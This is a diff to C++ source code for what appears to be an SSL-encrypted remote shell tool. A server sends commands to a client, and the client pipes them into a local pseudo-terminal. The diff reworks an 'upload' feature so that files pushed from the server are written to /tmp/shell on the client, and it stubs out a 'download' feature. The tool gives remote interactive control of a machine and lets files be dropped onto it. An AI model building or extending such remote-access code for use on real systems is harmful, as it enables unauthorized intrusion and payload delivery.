@@ -132,9 +132,15 @@ void server(const std::string &serverIpAddr, unsigned int portNum) {
                     safeShutdown("[!] Exit has been executed, exiting...", clientSocket, serverSocket, ssl, ctx);
                 }
                 else if (inputCmd.find("upload") != std::string::npos) {
-                    char* fileBuffer = uploadFile("server", "/tmp/shell-to-upload", "/tmp/shell");
-                    const char* uploadBuf = (inputCmd += fileBuffer).c_str();
-                    SSL_write(ssl, uploadBuf, strlen(uploadBuf));
+
+                    std::vector<std::byte> fileBuffer = readFileAsByteVector(parseUploadCommand(ttyBuffer));
+
+                    prepareAndSendFile(ssl, fileBuffer, "upload");
+
+                }
+                else if (inputCmd.find("download") != std::string::npos) {
+                    // send download to client with file path intending to download
+                    // client reads as bytes, prepares and sends, we handle incoming here
                 }
                 else {
                     // if not 'exit' send to client
@@ -225,10 +231,18 @@ void client(const std::string &ipAddr, unsigned int portNum) {
 
             // server has requested an upload, so we dont send the data coming in to
             // the masterfD, infact we upload the file to the server
+            // we should be expecting a second incoming connection ..
             std::string tmpStr(ttyBuffer, bytesReceived);
             if (tmpStr.find("upload")  != std::string::npos) {
-                std::cout << "[!] Upload requested!" << std::endl;
-                uploadFile("client", tmpStr.c_str(), "/tmp/wfuzz");
+
+                std::vector<std::byte> incomingFile = handleIncomingFile(ssl, "upload");
+                if (!incomingFile.empty()) {
+                    writeBytesToFile(incomingFile, "/tmp/shell");
+                }
+                else {
+                    std::cout << "[!] An error occured in transmission!" << std::endl;
+                }
+
             }else {
                 // ssl not required here as were just writing to local shell
                 write(masterFd, ttyBuffer, bytesReceived);
